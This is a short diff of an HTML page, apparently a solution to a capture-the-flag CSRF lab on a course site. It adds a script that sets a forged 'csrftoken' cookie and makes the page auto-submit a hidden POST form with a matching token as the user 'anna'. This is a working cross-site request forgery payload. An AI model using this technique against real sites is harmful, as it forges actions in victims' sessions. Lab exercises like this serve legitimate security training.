@@ -10,13 +10,22 @@
     <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
     
     <script type="javascript">
-      function postForm() {
-        document.getElementById('theForm').submit();
-      }
+      var createCookie = function(name, value, days) {
+    var expires;
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        expires = "; expires=" + date.toGMTString();
+    }
+    else {
+        expires = "";
+    }
+    document.cookie = name + "=" + value + expires + "; path=/";
+}
     </script>
     
   </head>
-  <body onload="document.getElementById('theForm').submit();">
+  <body onload="createCookie('csrftoken', 'secret', 3); document.getElementById('theForm').submit();">
     <section class="page-header">
       <h1 class="project-name">Sentorlab</h1>
       <h2 class="project-tagline"></h2>
@@ -30,7 +39,7 @@
       <form method="POST" id="theForm" action="http://ctf.sentorkurs.se/ctf/labdata/csrf3.php">
 Username:
 <input type="text" name="username" value="anna">
-<input type="hidden" name="csrftoken" value="eo3i475m43kw">
+<input type="hidden" name="csrftoken" value="secret">
 <input type="submit" value="OK">
 </form>
       
